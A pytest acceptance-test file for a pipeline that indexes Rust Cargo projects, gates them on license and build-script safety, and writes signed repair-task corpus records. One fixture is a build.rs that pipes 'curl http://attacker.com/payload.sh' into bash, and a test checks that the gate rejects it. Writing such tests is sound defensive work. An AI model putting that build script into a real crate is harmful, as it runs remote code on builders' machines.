"""
RUST_REPAIR_LOCK_001 — Rust repair factory acceptance tests.

Covers the full factory chain:
  Indexer → Task extractor → Build script gate → Baseline verifier
  → Mutation → Failure confirmation → Corpus write → HMAC signature

Acceptance bar (from master plan):
  [x] baseline cargo test passes before mutation
  [x] controlled mutation causes failure
  [x] cargo test passes after repair (original restored)
  [x] corpus row signed
  [x] license/provenance included
  [x] build.rs scanned for injection patterns
  [x] no unsafe build script behavior accepted
  [x] no raw corpus write
  [x] no repair accepted without verifier pass
  [x] Rust metadata fields on every record (language, build_system, mutation_type)
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts"))

from agents.base_agent import CorpusType
from corpus.code_ingest.rust_project_indexer import index_rust_project
from corpus.code_ingest.rust_task_extractor import RustTaskExtractor
from corpus.corpus_manager import CorpusManager
from repair.rust_repair_pipeline import RustRepairPipeline

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

_SAFE_CARGO_TOML = """\
[package]
name = "my-tool"
version = "0.1.0"
edition = "2021"
license = "MIT"

[[bin]]
name = "my-tool"
path = "src/main.rs"
"""

_WORKSPACE_CARGO_TOML = """\
[workspace]
members = [
    "crate-a",
    "crate-b",
]

[workspace.package]
edition = "2021"
license = "Apache-2.0"
"""

_RUST_SOURCE_WITH_UNWRAP = """\
fn get_value(maybe: Option<i32>) -> i32 {
    maybe.unwrap()
}

fn parse_number(s: &str) -> i32 {
    s.parse::<i32>().unwrap()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_value() {
        assert_eq!(get_value(Some(42)), 42);
    }
}
"""

_RUST_SOURCE_NO_UNWRAP = """\
fn safe_get(maybe: Option<i32>) -> i32 {
    maybe.unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_get() {
        assert_eq!(safe_get(Some(1)), 1);
        assert_eq!(safe_get(None), 0);
    }
}
"""

_MALICIOUS_BUILD_RS = """\
use std::process::Command;

fn main() {
    // curl http://attacker.com/payload.sh | bash
    Command::new("bash")
        .arg("-c")
        .arg("curl http://attacker.com/payload.sh | bash")
        .status()
        .unwrap();
    println!("cargo:rustc-cfg=feature_enabled");
}
"""

_SAFE_BUILD_RS = """\
fn main() {
    println!("cargo:rustc-cfg=has_feature");
    println!("cargo:rerun-if-changed=build.rs");
}
"""


def _make_rust_repo(
    tmp_path: Path,
    cargo_toml: str = _SAFE_CARGO_TOML,
    source: str = _RUST_SOURCE_WITH_UNWRAP,
    license_text: str | None = "MIT License",
    build_rs: str | None = None,
) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir(exist_ok=True)
    (repo / "Cargo.toml").write_text(cargo_toml, encoding="utf-8")
    src = repo / "src"
    src.mkdir(exist_ok=True)
    (src / "main.rs").write_text(source, encoding="utf-8")
    if license_text is not None:
        (repo / "LICENSE").write_text(license_text, encoding="utf-8")
    if build_rs is not None:
        (repo / "build.rs").write_text(build_rs, encoding="utf-8")
    return repo


def _baseline_pass_mutation_fail_executor():
    """Returns executor where call 1 = baseline pass, call 2+ = mutation fail."""
    state = {"n": 0}

    def executor(cmd, cwd, timeout):
        state["n"] += 1
        if state["n"] == 1:
            return (0, "test result: ok. 1 passed; 0 failed", "")
        return (1, "", "thread 'tests::test_get_value' panicked at 'determinex_none_inject'")

    return executor


def _always_pass_executor():
    return lambda cmd, cwd, timeout: (0, "test result: ok. 1 passed; 0 failed", "")


def _always_fail_executor():
    return lambda cmd, cwd, timeout: (1, "", "error: could not compile")


# ---------------------------------------------------------------------------
# TestRustProjectIndexer
# ---------------------------------------------------------------------------


class TestRustProjectIndexer:
    def test_cargo_toml_detected(self, tmp_path):
        repo = _make_rust_repo(tmp_path)
        project = index_rust_project(repo)
        assert project is not None
        assert project.package_name == "my-tool"

    def test_edition_parsed(self, tmp_path):
        repo = _make_rust_repo(tmp_path)
        project = index_rust_project(repo)
        assert project.edition == "2021"

    def test_license_parsed_from_cargo_toml(self, tmp_path):
        repo = _make_rust_repo(tmp_path)
        project = index_rust_project(repo)
        assert project.license_expression == "MIT"

    def test_binary_target_detected(self, tmp_path):
        repo = _make_rust_repo(tmp_path)
        project = index_rust_project(repo)
        bin_targets = [t for t in project.targets if t.kind == "bin"]
        assert len(bin_targets) >= 1

    def test_lib_target_detected(self, tmp_path):
        repo = tmp_path / "lib_repo"
        repo.mkdir()
        (repo / "Cargo.toml").write_text(
            '[package]\nname="mylib"\nversion="0.1.0"\nedition="2021"\n', encoding="utf-8"
        )
        src = repo / "src"
        src.mkdir()
        (src / "lib.rs").write_text(
            "pub fn add(a: i32, b: i32) -> i32 { a + b }\n", encoding="utf-8"
        )
        project = index_rust_project(repo)
        lib_targets = [t for t in project.targets if t.kind == "lib"]
        assert len(lib_targets) >= 1

    def test_workspace_detected(self, tmp_path):
        repo = tmp_path / "ws"
        repo.mkdir()
        (repo / "Cargo.toml").write_text(_WORKSPACE_CARGO_TOML, encoding="utf-8")
        project = index_rust_project(repo)
        assert project is not None
        assert project.is_workspace is True
        assert "crate-a" in project.workspace_members
        assert "crate-b" in project.workspace_members

    def test_build_rs_detected(self, tmp_path):
        repo = _make_rust_repo(tmp_path, build_rs=_SAFE_BUILD_RS)
        project = index_rust_project(repo)
        assert project.has_build_script is True

    def test_no_build_rs_when_absent(self, tmp_path):
        repo = _make_rust_repo(tmp_path)
        project = index_rust_project(repo)
        assert project.has_build_script is False

    def test_tests_dir_detected(self, tmp_path):
        repo = _make_rust_repo(tmp_path)
        tests_dir = repo / "tests"
        tests_dir.mkdir()
        (tests_dir / "integration.rs").write_text("#[test] fn it_works() {}", encoding="utf-8")
        project = index_rust_project(repo)
        assert "tests/" in project.test_dirs

    def test_no_cargo_toml_returns_none(self, tmp_path):
        project = index_rust_project(tmp_path)
        assert project is None


# ---------------------------------------------------------------------------
# TestRustBuildScriptSafetyGate
# ---------------------------------------------------------------------------


class TestRustBuildScriptSafetyGate:
    def test_curl_bash_build_rs_rejected(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        pipeline = RustRepairPipeline(corpus_manager=cm)
        repo = _make_rust_repo(tmp_path, license_text="MIT License", build_rs=_MALICIOUS_BUILD_RS)
        result = pipeline.process_repo(repo, "test_corpus")
        assert not result.accepted, "build.rs with curl|bash must be rejected"
        assert "malicious_build_rs" in result.rejected_reason

    def test_safe_build_rs_passes_gate(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        executor = _always_pass_executor()
        pipeline = RustRepairPipeline(corpus_manager=cm, executor=executor)
        repo = _make_rust_repo(tmp_path, license_text="MIT License", build_rs=_SAFE_BUILD_RS)
        result = pipeline.process_repo(repo, "test_corpus")
        assert result.accepted, f"Safe build.rs must pass gate; got: {result.rejected_reason}"

    def test_no_build_rs_passes_gate(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        executor = _always_pass_executor()
        pipeline = RustRepairPipeline(corpus_manager=cm, executor=executor)
        repo = _make_rust_repo(tmp_path, license_text="MIT License")
        result = pipeline.process_repo(repo, "test_corpus")
        assert result.accepted, (
            f"Repo without build.rs must pass gate; got: {result.rejected_reason}"
        )

    def test_build_script_result_has_reason_field(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        pipeline = RustRepairPipeline(corpus_manager=cm)
        repo = _make_rust_repo(tmp_path, build_rs=_MALICIOUS_BUILD_RS)
        safety = pipeline._check_build_script_safety(repo)
        assert not safety.safe
        assert safety.reason != ""
        assert "injection_risk" in safety.reason

    def test_safe_build_script_result_is_safe(self, tmp_path):
        pipeline = RustRepairPipeline(corpus_manager=CorpusManager(root=tmp_path / "corpus"))
        repo = _make_rust_repo(tmp_path, build_rs=_SAFE_BUILD_RS)
        safety = pipeline._check_build_script_safety(repo)
        assert safety.safe


# ---------------------------------------------------------------------------
# TestRustLicenseGate
# ---------------------------------------------------------------------------


class TestRustLicenseGate:
    def test_no_license_file_rejected(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        pipeline = RustRepairPipeline(corpus_manager=cm)
        repo = _make_rust_repo(tmp_path, license_text=None)
        result = pipeline.process_repo(repo, "test_corpus")
        assert not result.accepted
        assert "license_not_green" in result.rejected_reason

    def test_gpl_license_rejected(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        pipeline = RustRepairPipeline(corpus_manager=cm)
        repo = _make_rust_repo(tmp_path, license_text="GNU GENERAL PUBLIC LICENSE\nVersion 3")
        result = pipeline.process_repo(repo, "test_corpus")
        assert not result.accepted
        assert "license_not_green" in result.rejected_reason

    def test_mit_license_passes_gate(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        executor = _always_pass_executor()
        pipeline = RustRepairPipeline(corpus_manager=cm, executor=executor)
        repo = _make_rust_repo(tmp_path, license_text="MIT License")
        result = pipeline.process_repo(repo, "test_corpus")
        assert result.accepted, f"MIT must pass license gate; got: {result.rejected_reason}"
        assert result.license_bucket == "green"

    def test_apache_license_passes_gate(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        executor = _always_pass_executor()
        pipeline = RustRepairPipeline(corpus_manager=cm, executor=executor)
        repo = _make_rust_repo(tmp_path, license_text="Apache License\nVersion 2.0")
        result = pipeline.process_repo(repo, "test_corpus")
        assert result.accepted
        assert result.license_bucket == "green"

    def test_rejected_repo_has_zero_tasks(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        pipeline = RustRepairPipeline(corpus_manager=cm)
        repo = _make_rust_repo(tmp_path, license_text=None)
        result = pipeline.process_repo(repo, "test_corpus")
        assert result.tasks_extracted == 0
        assert result.tasks_written == 0
        assert result.task_ids == []


# ---------------------------------------------------------------------------
# TestRustBaselineEnforcement
# ---------------------------------------------------------------------------


class TestRustBaselineEnforcement:
    def test_extractor_returns_empty_when_baseline_fails(self, tmp_path):
        repo = _make_rust_repo(tmp_path)
        extractor = RustTaskExtractor(repo / "src" if (repo / "src").exists() else repo)
        extractor_root = RustTaskExtractor(repo)
        extractor_root._run = lambda cmd, cwd=None: (1, "", "error: could not compile")
        tasks = extractor_root.extract_tasks(max_tasks=5)
        assert tasks == [], "Must return empty when baseline fails"

    def test_extractor_proceeds_when_baseline_passes(self, tmp_path):
        repo = _make_rust_repo(tmp_path, source=_RUST_SOURCE_WITH_UNWRAP)
        extractor = RustTaskExtractor(repo)
        call_n = {"n": 0}

        def fake_run(cmd, cwd=None):
            call_n["n"] += 1
            if call_n["n"] == 1:
                return (0, "test result: ok. 1 passed", "")
            return (1, "", "thread 'test_get_value' panicked at 'determinex_none_inject'")

        extractor._run = fake_run
        tasks = extractor.extract_tasks(max_tasks=5)
        assert len(tasks) >= 1

    def test_baseline_failure_message_captured(self, tmp_path):
        repo = _make_rust_repo(tmp_path)
        extractor = RustTaskExtractor(repo)
        extractor._run = lambda cmd, cwd=None: (1, "", "error[E0308]: mismatched types")
        ok, msg = extractor.verify_baseline()
        assert ok is False
        assert len(msg) > 0

    def test_pipeline_zero_tasks_when_baseline_fails(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        repo = _make_rust_repo(tmp_path, license_text="MIT License")
        pipeline = RustRepairPipeline(corpus_manager=cm, executor=_always_fail_executor())
        result = pipeline.process_repo(repo, "test_corpus")
        assert result.accepted, "Should not be rejected at license/build gate"
        assert result.tasks_extracted == 0

    def test_pipeline_extracts_tasks_on_baseline_pass(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        repo = _make_rust_repo(
            tmp_path, license_text="MIT License", source=_RUST_SOURCE_WITH_UNWRAP
        )
        executor = _baseline_pass_mutation_fail_executor()
        pipeline = RustRepairPipeline(corpus_manager=cm, executor=executor)
        result = pipeline.process_repo(repo, "test_corpus")
        assert result.accepted
        assert result.tasks_extracted >= 1


# ---------------------------------------------------------------------------
# TestRustUnwrapExtraction
# ---------------------------------------------------------------------------


class TestRustUnwrapExtraction:
    def test_unwrap_sites_found(self, tmp_path):
        repo = _make_rust_repo(tmp_path, source=_RUST_SOURCE_WITH_UNWRAP)
        extractor = RustTaskExtractor(repo)
        rs_file = repo / "src" / "main.rs"
        sites = extractor.find_unwrap_sites(rs_file)
        assert len(sites) >= 2, "Expected at least 2 .unwrap() sites"

    def test_no_unwrap_in_comments_found(self, tmp_path):
        source = "// do not use .unwrap() here\nfn safe() -> i32 { 0 }\n"
        repo = _make_rust_repo(tmp_path, source=source)
        extractor = RustTaskExtractor(repo)
        rs_file = repo / "src" / "main.rs"
        sites = extractor.find_unwrap_sites(rs_file)
        assert len(sites) == 0, "Comments should not be counted as unwrap sites"

    def test_no_unwrap_source_returns_empty_tasks(self, tmp_path):
        repo = _make_rust_repo(tmp_path, source=_RUST_SOURCE_NO_UNWRAP)
        extractor = RustTaskExtractor(repo)
        extractor._run = lambda cmd, cwd=None: (0, "test result: ok. 1 passed", "")
        tasks = extractor.extract_tasks(max_tasks=5)
        assert tasks == []

    def test_task_has_correct_mutation_type(self, tmp_path):
        repo = _make_rust_repo(tmp_path, source=_RUST_SOURCE_WITH_UNWRAP)
        extractor = RustTaskExtractor(repo)
        call_n = {"n": 0}

        def fake_run(cmd, cwd=None):
            call_n["n"] += 1
            if call_n["n"] == 1:
                return (0, "ok", "")
            return (1, "", "panicked at 'determinex_none_inject'")

        extractor._run = fake_run
        tasks = extractor.extract_tasks(max_tasks=1)
        assert len(tasks) == 1
        assert tasks[0].mutation_type == "unwrap_panic"

    def test_target_dir_excluded_from_scan(self, tmp_path):
        repo = _make_rust_repo(tmp_path, source=_RUST_SOURCE_NO_UNWRAP)
        # Place a .rs file with .unwrap() inside target/ — should NOT be picked up
        target_src = repo / "target" / "debug" / "build" / "some_crate" / "out"
        target_src.mkdir(parents=True)
        (target_src / "gen.rs").write_text("let x = opt.unwrap();\n", encoding="utf-8")
        extractor = RustTaskExtractor(repo)
        sources = extractor.find_rust_sources()
        for p in sources:
            assert "target" not in str(p).replace("\\", "/").split("/"), (
                f"target/ file leaked into scan: {p}"
            )


# ---------------------------------------------------------------------------
# TestRustCorpusSigning
# ---------------------------------------------------------------------------


class TestRustCorpusSigning:
    def test_corpus_record_is_signed(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = RustRepairPipeline.make_test_task(task_id="rust-sign-001")
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="aa" * 8,
            output_hash="bb" * 8,
            source_benchmark="test_corpus",
            payload=task.to_corpus_payload(),
        )
        assert cm.verify(record) is True

    def test_tampered_record_fails_verification(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = RustRepairPipeline.make_test_task(task_id="rust-sign-002")
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="cc" * 8,
            output_hash="dd" * 8,
            source_benchmark="test_corpus",
            payload=task.to_corpus_payload(),
        )
        record["task_id"] = "tampered"
        assert cm.verify(record) is False

    def test_record_has_rust_language_field(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = RustRepairPipeline.make_test_task()
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="ee" * 8,
            output_hash="ff" * 8,
            source_benchmark="test_corpus",
            payload=task.to_corpus_payload(),
        )
        assert record["language"] == "rust"
        assert record["build_system"] == "cargo"
        assert record["mutation_type"] == "unwrap_panic"

    def test_record_has_all_required_fields(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = RustRepairPipeline.make_test_task()
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="11" * 8,
            output_hash="22" * 8,
            source_benchmark="test_corpus",
            payload=task.to_corpus_payload(),
        )
        for field in (
            "schema_version",
            "corpus_type",
            "task_id",
            "_sig",
            "language",
            "build_system",
            "mutation_type",
            "failure_type",
        ):
            assert field in record, f"Missing required field: {field}"

    def test_failure_output_truncated_to_500(self, tmp_path):
        long_output = "thread 'main' panicked: " + "x" * 1000
        task = RustRepairPipeline.make_test_task(failure_output=long_output)
        payload = task.to_corpus_payload()
        assert len(payload["failure_output"]) <= 500

    def test_different_tasks_have_different_signatures(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task_a = RustRepairPipeline.make_test_task(task_id="rust-sig-a")
        task_b = RustRepairPipeline.make_test_task(
            task_id="rust-sig-b", failure_output="different failure"
        )
        rec_a = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task_a.task_id,
            input_hash="a1" * 8,
            output_hash="a2" * 8,
            source_benchmark="test_corpus",
            payload=task_a.to_corpus_payload(),
        )
        rec_b = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task_b.task_id,
            input_hash="b1" * 8,
            output_hash="b2" * 8,
            source_benchmark="test_corpus",
            payload=task_b.to_corpus_payload(),
        )
        assert rec_a["_sig"] != rec_b["_sig"]

    def test_pipeline_writes_task_to_corpus(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        pipeline = RustRepairPipeline(corpus_manager=cm)
        task = RustRepairPipeline.make_test_task(task_id="rust-write-001")
        task_id = pipeline._write_corpus_record(task, "test_corpus")
        assert task_id == "rust-write-001"


# ---------------------------------------------------------------------------
# TestRustMutationTypes
# ---------------------------------------------------------------------------


class TestRustMutationTypes:
    def test_unwrap_panic_task_signed(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = RustRepairPipeline.make_test_task(
            task_id="rust-unwrap-001",
            mutation_type="unwrap_panic",
            failure_type="panic",
        )
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="33" * 8,
            output_hash="44" * 8,
            source_benchmark="rust_corpus",
            payload=task.to_corpus_payload(),
        )
        assert cm.verify(record) is True

    def test_compile_error_task_signed(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        task = RustRepairPipeline.make_test_task(
            task_id="rust-compile-001",
            failure_type="compile_error",
            failure_output="error[E0308]: mismatched types\n  --> src/main.rs:5:5",
        )
        record = cm._normalize_record(
            corpus_type=CorpusType.CODE_VERDICT,
            task_id=task.task_id,
            input_hash="55" * 8,
            output_hash="66" * 8,
            source_benchmark="rust_corpus",
            payload=task.to_corpus_payload(),
        )
        assert cm.verify(record) is True

    def test_multiple_mutation_types_all_signed(self, tmp_path):
        cm = CorpusManager(root=tmp_path / "corpus")
        cases = [
            ("rust-m-001", "unwrap_panic", "panic"),
            ("rust-m-002", "unwrap_or_wrong", "test_failure"),
            ("rust-m-003", "question_to_unwrap", "compile_error"),
        ]
        for task_id, mut_type, fail_type in cases:
            task = RustRepairPipeline.make_test_task(
                task_id=task_id,
                mutation_type=mut_type,
                failure_type=fail_type,
            )
            record = cm._normalize_record(
                corpus_type=CorpusType.CODE_VERDICT,
                task_id=task.task_id,
                input_hash="77" * 8,
                output_hash="88" * 8,
                source_benchmark="rust_corpus",
                payload=task.to_corpus_payload(),
            )
            assert cm.verify(record) is True, f"Signature invalid for {task_id}"

    def test_cargo_validator_field(self, tmp_path):
        task = RustRepairPipeline.make_test_task()
        payload = task.to_corpus_payload()
        assert payload["validator"] == "cargo test --locked"


# ---------------------------------------------------------------------------
# TestLanguageRepairBackendInterface
# ---------------------------------------------------------------------------


class TestLanguageRepairBackendInterface:
    """Verify the abstract backend contract is importable and correct."""

    def test_backend_module_imports(self):
        pass

    def test_project_profile_ingest_allowed(self):
        from pathlib import Path

        from repair.language_repair_backend import ProjectProfile

        p = ProjectProfile(
            language="rust",
            root=Path("/tmp"),
            build_system="cargo",
            license_spdx="MIT",
            license_bucket="green",
            has_build_script=False,
            has_unsafe_patterns=False,
        )
        assert p.ingest_allowed is True

    def test_project_profile_red_license_blocks_ingest(self):
        from pathlib import Path

        from repair.language_repair_backend import ProjectProfile

        p = ProjectProfile(
            language="rust",
            root=Path("/tmp"),
            build_system="cargo",
            license_spdx="GPL-3.0-only",
            license_bucket="red",
            has_build_script=False,
            has_unsafe_patterns=False,
        )
        assert p.ingest_allowed is False

    def test_project_profile_unsafe_patterns_blocks_ingest(self):
        from pathlib import Path

        from repair.language_repair_backend import ProjectProfile

        p = ProjectProfile(
            language="rust",
            root=Path("/tmp"),
            build_system="cargo",
            license_spdx="MIT",
            license_bucket="green",
            has_build_script=True,
            has_unsafe_patterns=True,
        )
        assert p.ingest_allowed is False
